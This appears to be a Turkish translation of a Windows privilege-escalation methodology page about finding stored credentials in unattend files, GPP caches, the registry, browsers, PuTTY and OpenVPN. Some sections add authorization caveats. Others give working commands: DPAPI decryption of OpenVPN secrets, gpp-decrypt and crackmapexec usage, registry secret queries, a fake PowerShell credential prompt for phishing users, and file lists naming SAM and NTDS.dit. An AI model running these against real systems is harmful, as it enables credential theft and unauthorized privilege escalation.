Okunabilir ve paylaşılan bir çalışma kitabının hesap verileri içerdiğinden şüpheleniliyorsa **dosya şifrelemesini** çalışma sayfası korumasından veya gizli sütunlardan ayırın. [Microsoft'a göre](https://support.microsoft.com/en-us/excel/protection-and-security-in-excel) çalışma sayfası koruması düzenlemeyi kısıtlar ve bir güvenlik özelliği değildir; tek başına çalışma kitabı içeriğinin şifrelendiğini göstermez. Yalnızca yetkili olduğunuz ve konuyla ilgili dosyaları inceleyin; kapsamlı numaralandırma sırasında olası sırları yazdırmaktan kaçının. Okunabilir bir `.xlsx` yolu, korumalı bir sayfa veya gizli bir sütun tek başına kimlik bilgilerinin bulunduğunu ya da herhangi bir hesabın daha yüksek ayrıcalıklara sahip olduğunu kanıtlamaz; gerçek verileri ve mevcut hesap haklarını ayrı ayrı doğrulayın.

### CI sunucusunda tutulan değişiklik yamaları

Bir CI sunucusu, derleme tamamlandıktan sonra bile gönderilen kaynak değişikliklerini veri dizininde tutabilir. [TeamCity belgelerinde](https://www.jetbrains.com/help/teamcity/teamcity-data-directory.html) `system/changes`, uzaktan çalıştırma değişikliklerinin depolandığı yer olarak belirtilir; veri dizini yapılandırılabilir ve `ProgramData` altında bulunması şart değildir. Okunabilir bir yama, kimlik bilgisi dosyasına, şifreleme anahtarına veya ikisini kullanan bir betiğe yönelik kaldırılmış ya da eklenmiş başvuruları koruyor olabilir. Örneğin, PowerShell'deki `ConvertTo-SecureString -Key` iş akışı hem AES anahtarını hem de şifrelenmiş dizgeyi gerektirir; [Microsoft](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring) anahtarın ayrı olarak sağlandığını belirtir. Önce yalnızca erişilebilir yama adlarını inceleyin, ardından sırları rutin numaralandırma çıktısına yazdırmadan ve yetkiniz kapsamında ilgili içeriği inceleyin. Bir yama yolu, şifrelenmiş bir değer veya anahtar başvurusu tek başına geçerli bir kimlik bilgisini ya da daha yüksek ayrıcalıklı erişimi kanıtlamaz. Veri dizini ACL'lerini kısıtlayın ve derleme değişikliklerine sır eklemekten kaçının.

### Özel yerel yönetici parolası döndürme

Özel geliştirilmiş bir parola döndürücü, şifrelenmiş yerel yönetici parolasını yerel bir hizmette saklarken veri deposu kimlik bilgilerini okunabilir bir `.env` dosyasında veya güncelleyici ikili dosyasının yanında tutabilir. Güncelleyicinin zamanlanmış görevini, hesabını, yapılandırma ACL'lerini, dinleyicisini ve veri deposu izinlerini birlikte inceleyin. Yalnızca loopback arabirimine bağlı bir veri deposuna, geçerli kimlik bilgilerine sahip yerel bir kullanıcı yine de erişebilir; ancak kimlik doğrulaması tek başına ilgili kayıtları okuma iznini kanıtlamaz. Şifreleme tohumu veya anahtar malzemesi şifreli metnin yanında erişilebiliyorsa şifrelemeye güvenmeden önce anahtar türetme yöntemini dikkatle inceleyin. Açığa çıkmış bir tohumdan Go'nun [`math/rand`](https://pkg.go.dev/math/rand) paketiyle deterministik olarak AES anahtarı türeten bir düzen, bu parolayı korumak için uygun değildir; Go, bu paketin güvenliğe duyarlı rastgelelik gerektiren durumlar için uygun olmadığını belirtir. Kurtarılan herhangi bir parolayı ayrıcalık yükseltme yolu olarak değerlendirmeden önce güncel olduğunu ve yerel Administrators grubu hesabına ait olduğunu doğrulayın. Zamanlanmış bir görev, `.env` yolu veya şifrelenmiş bir veri bloğu bu koşulların hiçbirini tek başına kanıtlamaz. Parolaları ve anahtar malzemesini rutin numaralandırma çıktısına eklemeyin.

Yönetilen yerel yönetici parolaları için [Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-overview) kullanın. LAPS'in dizin veya Entra destekli depolaması ve erişim denetimleri, özel bir yerel veri deposundan farklıdır; benzer şekilde, [Elasticsearch rolleri](https://www.elastic.co/guide/en/elasticsearch/reference/current/authorization.html/) kimliği doğrulanmış bir veri deposu kullanıcısının belirli bir dizini okuyup okuyamayacağını belirler.

### Java sunucusu eklenti arşivleri ve kimlik bilgisi yeniden kullanımı

Bazı Java sunucusu eklentileri, sunucunun `plugins` dizininde JAR arşivleri olarak dağıtılır. Okunabilir bir özel eklenti, gömülü bir hizmet kimlik bilgisi içeren yapılandırma veya bytecode barındırabilir. Arşivi yalnızca yetkiniz olduğunda inceleyin ve kurtarılan sırları rutin numaralandırma çıktısına eklemeyin. Bir eklentinin yolu tek başına sır bulunduğunu kanıtlamaz; kurtarılan bir hizmet parolası da ancak daha ayrıcalıklı bir hesap için geçerliyse daha yüksek ayrıcalıklara erişim sağlar. İlgili dosya ACL'lerini denetleyin ve yeniden kullanılan kimlik bilgilerini benzersiz sırlarla değiştirin. Dizin düzeni için [PaperMC'nin eklenti yükleme kılavuzuna](https://docs.papermc.io/paper/adding-plugins/), arşiv içeriği için [Oracle'ın JAR belgelerine](https://docs.oracle.com/javase/8/docs/technotes/guides/jar/index.html) bakın.

### Openfire gömülü veritabanı kimlik bilgileri

Gömülü veritabanı kullanan bir Openfire kurulumu, `openfire.script` dosyasını `Openfire\embedded-db` altında tutabilir. Geçerli hesap dosyayı okuyabiliyorsa `OFUSER` kayıtlarını ve `passwordKey` özelliğini birlikte inceleyin. Openfire'ın [kullanıcı sağlayıcısı belgelerine](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/openfire/user/DefaultUserProvider.html) göre parolalar düz metin olarak veya bu özellikte tutulan bir anahtarla şifrelenmiş biçimde saklanabilir. Kurtarılan bir parola, yalnızca daha ayrıcalıklı bir kimlik için hâlâ geçerliyse ayrıcalık yükseltme açısından önem taşır; dosya adı tek başına ne okuma erişimini ne de kimlik bilgisi yeniden kullanımını kanıtlar. Bu yol bir envanter ipucudur; veritabanı içeriğini ve kimlik bilgilerini rutin numaralandırma çıktısına eklemeyin.

Ayrı bir `Openfire\conf\openfire.xml` dosyası, harici bir veritabanı kullanılsa bile yönetici konsolu için yapılandırılmış portları ve bağlanma arayüzünü gösterebilir. Openfire genellikle yönetici konsolunu loopback arabirimine bağlar; dinleyici çalışıyorsa yerel bir hesap bu adrese yine de erişebilir. Gerçek dinleyiciyi, yetkili yönetici rolünü, eklenti yükleme politikasını ve Openfire hizmet kimliğini birlikte denetleyin. Eklenti yükleyebilen bir yönetici, eklenti kodunun hizmet bağlamında çalışmasına neden olabilir; hizmet LocalSystem olarak çalışıyorsa bu bağlam yüksek ayrıcalıklara sahip olabilir. Eşleşen bir hesap parolası veya okunabilir bir yapılandırma yolu tek başına yönetici konsoluna erişimi ya da kod yürütmeyi kanıtlamaz. Üreticinin [kurulum ve eklenti yönetimi kılavuzuna](https://download.igniterealtime.org/openfire/docs/latest/documentation/install-guide.html) ve [eklenti yükleme API özelliğine](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/admin/servlet/PluginServlet.html) bakın.

### Adli bilişim yönetim sunucusu yapılandırması

Genellikle `server.config.yaml` adı verilen Velociraptor sunucusu yapılandırmaları, dahili CA'nın `CA.private_key` değerini içerebilir. Daha düşük ayrıcalıklı bir kullanıcı bu anahtarı okuyabiliyorsa API istemci sertifikası oluşturabilir. Bunun daha yüksek ayrıcalıklara erişim sağlayıp sağlamadığı sunucunun kullanıcı rollerine, API erişilebilirliğine ve sunucunun veya hedef ajanın çalıştığı kimliğe bağlıdır. İstemci yapılandırması farklı malzemeler içerir; böyle bir yapılandırmayı bulmak sunucu CA'sına erişimi kanıtlamaz. Bazı dağıtımlarda CA özel anahtarı çevrimdışı tutulur; bu nedenle okunabilir bir sunucu yapılandırmasında imzalama anahtarı bulunmayabilir.

Bir Windows sunucusunda, kurulum dizinindeki **sunucu** yapılandırmasının ve korumalı yedek kopyalarının ACL'sini inceleyin. Olası konumlardan biri `%ProgramFiles%\VelociraptorServer\server.config.yaml` yoludur; farklıysa hizmetin yapılandırılmış yolunu kullanın. Geçerli kimliğin dosyayı okuyabildiğini ve `CA.private_key` değerinin gerçekten bulunduğunu doğrulayın. Özel anahtarı günlüklerde veya numaralandırma çıktısında yazdırmaktan kaçının. Üreticinin `config api_client` iş akışı istemci sertifikası oluşturmak için CA anahtarını kullanır; ancak etkili bir sunucu tarafı rolü de gerekir. Böyle bir rol oluşturmak veya değiştirmek veri deposuna yazma erişimi ya da yeniden başlatma gerektirebilir. Bu yazma işlemleri yapılamasa bile mevcut ayrıcalıklı bir sunucu kimliği bir yol sağlayabilir. Yürütme haklarına sahip API sorguları ilgili sunucu veya ajan bağlamında çalışır; bu bağlam yüksek ayrıcalıklara sahip olabilir.

Sunucu yapılandırmasını ve yedeklerini kısıtlayıcı ACL'lerle koruyun, mümkünse CA imzalama anahtarını çevrimdışı tutun ve API rollerini ve dinleyici erişimini sınırlandırın. [Velociraptor API belgelerine](https://docs.velociraptor.app/docs/server_automation/server_api/) ve [güvenlik yapılandırması kılavuzuna](https://docs.velociraptor.app/docs/deployment/security/) bakın.

### PuTTY Kimlik Bilgileri

```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```

Solar-PuTTY ayrı bir oturum yöneticisidir. Yerel şifreli deposu `%APPDATA%\SolarWinds\FreeTools\Solar-PuTTY\data.dat` konumunda olabilir; dışa aktarılan oturum yedeğinin adı `sessions-backup.dat` olabilir ve başka bir konumda saklanabilir. [SolarWinds’in dışa aktarma kılavuzuna](https://thwack.solarwinds.com/discussion/comment/115591) göre dışa aktarımlar parola ile şifrelenir ve oturumları, anahtarları, betikleri, etiketleri ve ilişkileri içerebilir; [destek forumu](https://thwack.solarwinds.com/discussion/4520/saved-session-lost) ise yerel depolamanın konumunu belirtir. Önce dosya izinlerini ve yolları kontrol edin. Bu dosyalardan birini bulmak, parolasını ortaya çıkarmaz veya kayıtlı kimlik bilgilerinin hâlâ geçerli ya da daha yüksek ayrıcalıklara sahip olduğunu kanıtlamaz.

### Putty SSH Host Anahtarları

```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```

### Kayıt defterindeki SSH keys

SSH private keys, `HKCU\Software\OpenSSH\Agent\Keys` kayıt defteri anahtarında saklanabilir; bu nedenle burada ilginç bir şey olup olmadığını kontrol etmelisiniz:

```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```

Bu yolun içinde herhangi bir kayıt bulursanız, muhtemelen kaydedilmiş bir SSH anahtarıdır. Şifrelenmiş olarak saklanır ancak [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract) kullanılarak kolayca çözülebilir.\
Bu teknik hakkında daha fazla bilgi: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)<sup>[[37]](#references)</sup>

`ssh-agent` hizmeti çalışmıyorsa ve açılışta otomatik olarak başlatılmasını istiyorsanız şunu çalıştırın:

```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```

> [!TIP]
> Bu tekniğin artık geçerli olmadığı anlaşılıyor. Bazı SSH anahtarları oluşturup bunları `ssh-add` ile eklemeyi ve bir makineye SSH üzerinden giriş yapmayı denedim. HKCU\Software\OpenSSH\Agent\Keys kayıt defteri anahtarı mevcut değil ve Procmon, asimetrik anahtar kimlik doğrulaması sırasında `dpapi.dll` kullanımını tespit etmedi.

### Katılımsız kurulum dosyaları

```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```

Bu dosyaları **metasploit** kullanarak da arayabilirsiniz: _post/windows/gather/enum_unattend_

Örnek içerik:

```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
    <AutoLogon>
     <Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
     <Enabled>true</Enabled>
     <Username>Administrateur</Username>
    </AutoLogon>

    <UserAccounts>
     <LocalAccounts>
      <LocalAccount wcm:action="add">
       <Password>*SENSITIVE*DATA*DELETED*</Password>
       <Group>administrators;users</Group>
       <Name>Administrateur</Name>
      </LocalAccount>
     </LocalAccounts>
    </UserAccounts>
```

### SAM & SYSTEM yedekleri

```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

Okunabilir Windows Imaging (`.wim`) yedek dosyaları çevrimdışı `SAM`, `SECURITY` ve `SYSTEM` hive'larını da içerebilir. Yerel olarak erişilebilen yedekleme veya imaj dizinlerine öncelik verin ve herhangi bir şeyi çıkarmadan önce imajın **üye adlarını** inceleyin; yalnızca `.wim` dosya adı hive'ların açığa çıktığını kanıtlamaz ve standart `install.wim`, `boot.wim` ve kurtarma imajları sık karşılaşılan yanlış ipuçlarıdır. SMB paylaşımı ayrı bir erişim yoludur ve yalnızca kapsam dahilindeyse kontrol edilmelidir. Microsoft'un [Windows image guidance](https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/work-with-windows-images) ve [registry hive file reference](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives) belgelerine bakın.

### Bulut Kimlik Bilgileri

```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```

### McAfee SiteList.xml

**SiteList.xml** adlı dosyayı arayın.

### Önbelleğe Alınmış GPP Parolası

Daha önce, Group Policy Preferences (GPP) aracılığıyla bir makine grubuna özel yerel yönetici hesaplarının dağıtılmasına olanak tanıyan bir özellik mevcuttu. Ancak bu yöntemin önemli güvenlik açıkları vardı. İlk olarak, SYSVOL'da XML dosyaları olarak depolanan Group Policy Objects (GPO'lar) tüm etki alanı kullanıcıları tarafından erişilebilirdi. İkinci olarak, bu GPP'lerdeki parolalar, herkese açık olarak belgelenmiş varsayılan bir anahtar kullanılarak AES256 ile şifrelenmişti ve kimliği doğrulanmış herhangi bir kullanıcı tarafından çözülebiliyordu. Bu durum, kullanıcıların yükseltilmiş ayrıcalıklar elde etmesine yol açabileceğinden ciddi bir risk oluşturuyordu.

Bu riski azaltmak için, boş olmayan bir "cpassword" alanı içeren yerel olarak önbelleğe alınmış GPP dosyalarını tarayan bir işlev geliştirildi. Böyle bir dosya bulunduğunda, işlev parolanın şifresini çözer ve özel bir PowerShell nesnesi döndürür. Bu nesne, güvenlik açığının belirlenmesine ve giderilmesine yardımcı olmak için GPP ve dosyanın konumu hakkında ayrıntılar içerir.

Bu dosyaları `C:\ProgramData\Microsoft\Group Policy\history` veya _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (W Vista öncesi)_ konumlarında arayın:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**cPassword'ın şifresini çözmek için:**

```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```

Parolaları almak için crackmapexec kullanma:

```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```

### IIS Web Config

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

Kimlik bilgileri içeren web.config örneği:

```xml
<authentication mode="Forms">
    <forms name="login" loginUrl="/admin">
        <credentials passwordFormat = "Clear">
            <user name="Administrator" password="SuperAdminPassword" />
        </credentials>
    </forms>
</authentication>
```

### IIS webroot içindeki yedek arşivleri

Doğrudan sunulan bir webroot içine yerleştirilmiş eski bir ZIP yedeği, önceki yapılandırma dosyalarını ve yeniden kullanılabilir kimlik bilgilerini açığa çıkarabilir. Bunu bir veri açığı olarak değerlendirmeden önce sitenin yapılandırılmış fiziksel yolunu ve arşive HTTP üzerinden gerçekten erişilip erişilemediğini kontrol edin. Varsayılan `C:\inetpub\wwwroot` yolu yalnızca olası bir konumdur. Hızlı bir yerel envanter, arşivleri açmadan adları ve boyutları listeleyebilir:

```powershell
Get-ChildItem -LiteralPath 'C:\inetpub\wwwroot' -File -Filter '*.zip' -ErrorAction SilentlyContinue |
  Where-Object Name -Match 'backup' | Select-Object Name, Length
```

Bir arşivin adı, içinde gizli bilgi bulunduğunu veya ele geçirilen bir kimlik bilgisinin daha yüksek ayrıcalık sağladığını kanıtlamaz.

### OpenVPN kimlik bilgileri

```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
  $encryptedbytes=$item.'auth-data'
  $entropy=$item.'entropy'
  $entropy=$entropy[0..(($entropy.Length)-2)]

  $decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
    $encryptedBytes,
    $entropy,
    [System.Security.Cryptography.DataProtectionScope]::CurrentUser)

  Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```

### Loglar

```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```

### Kimlik bilgilerini isteyin

Bunları bilebileceğini düşünüyorsanız **kullanıcıdan kendi kimlik bilgilerini, hatta farklı bir kullanıcının kimlik bilgilerini girmesini her zaman isteyebilirsiniz** (istemciden doğrudan **kimlik bilgilerini** **istemek** gerçekten **risklidir**):

```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```

### **Kimlik bilgileri içerebilecek dosya adları**

Geçmişte **parolaları** **düz metin** veya **Base64** biçiminde içeren bilinen dosyalar

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
*.psafe3
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

Password Safe v3 veritabanlarında genellikle `.psafe3` uzantısı kullanılır. Eşleşen bir dosya adını şifrelenmiş kasa adayı olarak değerlendirin; dosyanın varlığı, onu okuyabileceğinizi, kilidini açabileceğinizi veya içinde kayıtlı kimlik bilgilerini kullanabileceğinizi göstermez. Bu dosyaların nerede saklandığını incelerken erişilebilir kullanıcı profillerini ve yapılandırılmış dosya paylaşım köklerini kontrol edin.

Okunabilir bir KeePass `.kdbx` dosyası da yalnızca şifrelenmiş bir kasa ipucudur. Kilidini açmak için gerçek ana parola ve yapılandırılmış tüm anahtar dosyası veya hesap faktörleri gerekir. Yetkili bir incelemede bir girdide LM:NT hash çifti bulunursa, [pass-the-hash](../ntlm/README.md#pass-the-hash) seçeneğini değerlendirmeden önce adı geçen hesabı ve NT hash'inin güncel olup olmadığını ve hedefin NTLM hizmeti tarafından kabul edilip edilmediğini doğrulayın. Kasa girdisi tek başına Administrator veya SYSTEM hakları sağlamaz; uzaktan hizmet erişimi, hesap hakları ve ayrı bir hizmet çalıştırma adımı da mevcut olmalıdır. Envanterde veritabanını veya kayıtlı kimlik bilgilerini yazdırmak yerine kasa yolunu ve okunabilirlik durumunu bildirin.

Önerilen tüm dosyaları arayın:

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == *.psafe3 == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```

### Geri Dönüşüm Kutusu'ndaki kimlik bilgileri

Silinmiş yedekleri ve yapılandırma arşivlerini, ayrıca adında açıkça kimlik bilgilerinden söz edilen dosyaları bulmak için erişilebilen Geri Dönüşüm Kutusu öğelerini kontrol edin. Kullanışlı bir `.7z`, `.zip` veya `.rar` yedeği aylar öncesine ait olabilir ve sıradan bir dosya adına sahip olabilir. Windows, özgün yolu ve silinme zamanını bir `$I` kaydında, silinen dosyayı ise bunun eşleşen `$R` girdisinde saklar; bir arşivi açmadan önce meta verileri ve mevcut kimliğin okuma erişimini inceleyin. Görünürlük birime, kullanıcı SID'sine ve dosya izinlerine bağlıdır; bu nedenle listenin boş olması, kurtarılabilir bir yedeğin bulunmadığını kanıtlamaz. Arşiv adını, geçerli bir sır içerdiğinin kanıtı olarak değil, inceleme adayı olarak değerlendirin.

Erişilebilen silinmiş bir `.pfx`, **code-signing** için de bir ipucu olabilir. Erişilebilir bir özel anahtar içeriyorsa, bu anahtar değiştirilmiş bir PowerShell betiğini imzalayabilir; [PowerShell, özel anahtarı olan bir code-signing sertifikası gerektirir](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-authenticodesignature) ve [AppLocker yayıncı kuralları imzalayanın kimliğini ve kural kapsamını değerlendirir](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/understanding-the-publisher-rule-condition-in-applocker). Hesaplar arası yürütme için mevcut kimliğin ilgili betiği değiştirebilmesi, etkin bir kuralın betik ve hedef hesap için ortaya çıkan imzayı kabul etmesi ve zamanlanmış bir görevin veya daha yüksek ayrıcalıklı başka bir tüketicinin betiği gerçekten çalıştırması gerekir. Tek başına `.pfx` dosya adı, sertifika konusu veya yazılabilir bir betik bu zincirin varlığını kanıtlamaz. Özel anahtar içeren materyali açmadan veya görevi tetiklemeden önce meta verileri, ACL'leri, ilkeyi ve zamanlanmış komutu inceleyin.

Kimlik bilgilerine ilişkin ipuçları için erişilebilen mesajlaşma istemcisi profili veritabanlarını, notları ve alınan dosyaları da inceleyin. BitLocker kurtarma anahtarı dışa aktarımı HTML veya TXT olarak, bazen adı belli bir yedekleme arşivinin içinde saklanabilir. Bu tür materyaller, daha eski yedekleri içeren ayrı bir şifreli veri birimine erişim sağlayabilir; birimi ve arşivi yalnızca erişim yetkiniz varsa inceleyin. Bir yedek `NTDS.dit` içeriyorsa, çevrimdışı etki alanı kimlik bilgilerini kurtarmak için [yedekleme ve ayrıcalıklı gruplar iş akışında](../active-directory-methodology/privileged-groups-and-token-privileges.md) açıklandığı gibi eşleşen `SYSTEM` kovanı da gerekir. Dosya adları ve kilitli bir birim tek başına kullanılabilir bir kurtarma anahtarının veya etki alanı yedeğinin varlığını kanıtlamaz.

Birden fazla programın kaydettiği **parolaları kurtarmak** için şunu kullanabilirsiniz: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Kayıt defterinin içinde

**Kimlik bilgileri içerebilecek diğer kayıt defteri anahtarları**

```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```

[**Kayıt defterinden openssh anahtarlarını çıkarın.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Tarayıcı Geçmişi

**Chrome, Edge veya Firefox** parolalarının saklandığı veritabanlarını kontrol etmelisiniz.\
Ayrıca tarayıcıların geçmişini, yer işaretlerini ve sık kullanılanlarını da kontrol edin; parolalar orada saklanıyor olabilir.

Mevcut kullanıcının standart Edge **Default** profili için `Login Data`, `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default` konumunda; `Local State` ise bu dosyanın üst dizini olan `User Data` dizinindedir. [Microsoft varsayılan profil konumunu belgeliyor](https://learn.microsoft.com/en-us/deployedge/edge-learnmore-create-user-directory-vars); başka bir profil veya `UserDataDir` ilkesi bu konumu değiştirebilir. Dosyanın mevcut olması yalnızca bir kimlik bilgisi deposuna işaret eder: okunabilir dosyaları, ilgili kullanıcının DPAPI bağlamını veya erişim izni olan diğer anahtar materyallerini ve kayıtlı girişin daha ayrıcalıklı bir hesaba ait olup olmadığını doğrulayın. Yalnızca yolları listelemek için veritabanını açmanız veya şifresi çözülmüş parolaları yazdırmanız gerekmez.

Firefox için [Mozilla, bir profilin `key4.db` ve `logins.json` dosyalarının eşleşen anahtar ve şifrelenmiş giriş dosyaları olduğunu belgeliyor](https://support.mozilla.org/en-US/kb/recovering-important-data-from-an-old-profile). Bunların mevcut olması yalnızca bir ipucudur: her iki dosyanın da okunabilir olup olmadığını, kayıtlı girdilerin bulunup bulunmadığını ve kimlik bilgilerinin kullanılabilir olduğu sonucuna varmadan önce anahtarın Primary Password ile korunup korunmadığını kontrol edin. Kurtarılan bir kimlik bilgisi bir etki alanı hesabına aitse, bu hesabın etkin grup denetimi izinlerini ve grubun [LAPS parola okuma veya şifresini çözme izinlerini](../active-directory-methodology/laps.md) ayrı ayrı inceleyin; tarayıcı kalıntıları tek başına bir yönetici erişim yolu olduğunu kanıtlamaz.

Tarayıcılardan parola çıkarmak için araçlar:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)**, farklı dillerdeki yazılım bileşenleri arasında **iletişim** kurulmasını sağlayan, Windows işletim sisteminde yerleşik bir teknolojidir. Her COM bileşeni bir **sınıf kimliği (CLSID) ile tanımlanır** ve her bileşen, arabirim kimlikleri (IID'ler) ile tanımlanan bir veya daha fazla arabirim aracılığıyla işlevsellik sunar.

COM sınıfları ve arabirimleri sırasıyla **HKEY\CLASSES\ROOT\CLSID** ve **HKEY\CLASSES\ROOT\Interface** altında kayıt defterinde tanımlanır. Bu kayıt defteri, **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT** birleştirilerek oluşturulur.

Bu kayıt defterinin CLSID'leri içinde, bir **DLL**'yi gösteren **varsayılan değer** ile **ThreadingModel** adlı değeri içeren **InProcServer32** alt anahtarını bulabilirsiniz. Bu değer **Apartment** (Tek İş Parçacıklı), **Free** (Çok İş Parçacıklı), **Both** (Tek veya Çok İş Parçacıklı) ya da **Neutral** (İş Parçacığından Bağımsız) olabilir.

